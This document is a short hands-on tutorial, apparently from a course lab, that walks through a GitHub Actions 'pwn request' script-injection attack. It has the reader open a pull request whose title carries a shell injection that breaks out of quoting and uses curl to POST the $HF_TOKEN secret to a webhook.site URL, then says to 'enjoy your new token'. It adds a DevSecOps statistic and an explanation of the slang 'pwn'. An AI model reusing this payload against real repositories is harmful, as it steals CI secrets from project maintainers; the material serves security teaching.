# Simulation of a trend attack in 2026

In you second GitHub account, fork the first repo that you created earlier. Change some lines of the project and commit. Now go and send a pull-request (PR) for the main maintainer of the project. 

Before doing anything else, got to the website `https://webhook.site/` and get your unique URL for this scenario as I did in the video.

On the PR title, insert the following command:

```bash
Edited train.py and "; curl -X POST -d "my-love=$HF_TOKEN" https://webhook.site/7a79ba90-605d-4012-8924-eab1e1ac8758; echo "
```

Now go to `https://webhook.site/7a79ba90-605d-4012-8924-eab1e1ac8758` and enjoy your new token 🚀.

You can investigate the hardened workflow file also and learn the best practices regarding these issues.



## Are this attack still wide spread in the world?

In February, we released the [2026 State of DevSecOps](https://www.datadoghq.com/state-of-devsecops/) report, but one of the most striking findings didn’t make it into the final write-up:

**38% of organizations have a GitHub Actions workflow vulnerable to script injection or dangerous trigger issues.** 



**Reference:** https://securitylabs.datadoghq.com/articles/case-for-github-actions-security/ 



## Some Notes regarding this attack name `pwn attack`

In the context of online security, **pwned** often means that your account or system has been breached, and your passwords--user passwords or privileged passwords--have been compromised. The word originated in online gaming forums as a misspelling of “owned.”

**Pwn** (pronounced “pone”) is hacker slang for **“own”**. It means completely taking control of a system, account, or machine successfully, so you “own” it. That’s why the attack is called a **“pwn request”**.

